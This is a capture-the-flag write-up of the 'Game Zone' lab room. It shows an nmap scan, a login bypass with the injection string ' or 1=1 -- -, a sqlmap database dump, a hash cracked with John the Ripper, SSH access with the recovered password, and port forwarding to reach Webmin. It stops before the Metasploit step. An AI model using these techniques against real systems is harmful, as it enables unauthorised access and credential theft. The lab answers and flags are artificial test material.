# Game Zone
This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

# Task 1 Deploy the vulnerable machine

First quick NMAP scan:
```
nmap -Pn -sV 10.67.177.222
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-24 19:34 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.67.177.222
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```
Looks like just port 22 and 80.

## Q1 What is the name of the large cartoon avatar holding a sniper on the forum?
Answer: Agent 47 from the game "hitman: codename 47" is obtainable from tineye aswell. From tineye seems like it might be linked from xbox game "hitman abolution".

# Task 2 Obtain access via SQLi
In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

SELECT * FROM users WHERE username = :username AND password := password

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here a vulnerability is taken advantage of by including in the username and leaving password blank: 
' or 1=1 -- - 

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

## Q1 When you've logged in, what page do you get redirected to?
Answer: portal.php

# Task 3 Using SQLMap

- We're going to use SQLMap to dump the entire database for GameZone.

- Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

- First we need to intercept a request made to the search feature using BurpSuite.

- Intercept a basic request which will be used in SQLmap and copy it's text from burpe suite into a text file.
- Pass this request text file into SQLmap, which will take advantage of the authenticated user session to dump entire database.
- Run:
  sql -r request.txt --dbms=mysql --dump
  where:
  -r uses the intercepted request you saved earlier
  --dbms tells SQLMap what type of database management system it is
  --dump attempts to outputs the entire database

  - Acknowledge Yes for further testing, and storing hashes in temporary file.
  - Use the default dictionary for wordlists.tx_.
  - Use common password suffixes y (its slow but gets it done).

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ sqlmap -r /mnt/CTF/Game_Zone/request.txt --dbms=mysql --dump
        ___
       __H__                                                                                        ___ ___[,]_____ ___ ___  {1.9.8#stable}                                                           |_ -| . [']     | .'| . |                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                 
...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
...
...
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
...
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+---------------------------------------------------------
...
[03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/post.csv'                      ...
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[03:13:14] [INFO] writing hashes to a temporary file '/tmp/sqlmapkoglbk6r247838/sqlmaphashes-tz21s7dm.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:13:22] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[03:13:35] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
...                         
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/users.csv'                                                                                                                      
[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157'
[03:15:09] [WARNING] your sqlmap version is outdated

[*] ending @ 03:15:09 /2026-04-26/
```
## Q1 In the users table, what is the hashed password?
Answer: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

## Q2 What was the username associated with the hashed password?
Answer: agent47

## Q3 What was the other table name?
Answer: POST

# Task4 Cracking a password with JohnTheRipper
Here we already have the hash and aparently its a sha256

john --format=raw-sha256 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.


## Q1 What is the de-hashed password?
Answer: videogamer124

## Q2 Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?
```
$ ssh agent47@10.49.166.157                                            
The authenticity of host '10.49.166.157 (10.49.166.157)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.166.157' (ED25519) to the list of known hosts.
agent47@10.49.166.157's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ exit
logout
Connection to 10.49.166.157 closed.
```
Answer: 649ac17b1480ac13ef1e4fa579dac95c

# Task 5 Exposing services with reverse SSH tunnels

Local Port Forwarding (‑L)
Local port forwarding lets you “pull” a remote service through an SSH server. Your machine listens on a local port, and traffic sent to that port is forwarded through the SSH connection to a destination the SSH server can reach.

Example:
```
ssh -L 9000:example.com:80 user@example.com
```
Visiting: http://localhost:9000
sends the request through the SSH server, which then connects to example.com:80 on your behalf. This technique is commonly used to access services blocked on the local network or to route traffic through a trusted remote host.

## Q1 We will use a tool called 'ss' to investigate sockets running on a host. How many TCP sockets are running?

If we run ss -tulpn it will tell us what socket connections are running

Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

Answer: 5 TCP only.

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp   UNCONN     0      0        *:68                   *:*                  
udp   UNCONN     0      0        *:10000                *:*                  
tcp   LISTEN     0      80     127.0.0.1:3306                 *:*                  
tcp   LISTEN     0      128      *:10000                *:*                  
tcp   LISTEN     0      128      *:22                   *:*                  
tcp   LISTEN     0      128     :::80                  :::*                  
tcp   LISTEN     0      128     :::22                  :::*                  
agent47@gamezone:~$ ss -tulp
```
## Q2 What is the name of the exposed CMS?
Answer:Webmin appears in the top of the login screen or in code in title section: <Title> Login to Webmin </Title>
## Q3 What is the CMS version?
Answer: 1.580, login to webmin is the same password as to connect with SSH. Then its displayed in main screen on login or in the "System Information link".

# Privilege Escalation with Metasploit

Next take advantage of webadmin to gain by searching for exploit through searchsploit, this lead us to finding a exploit is available through metasploit.
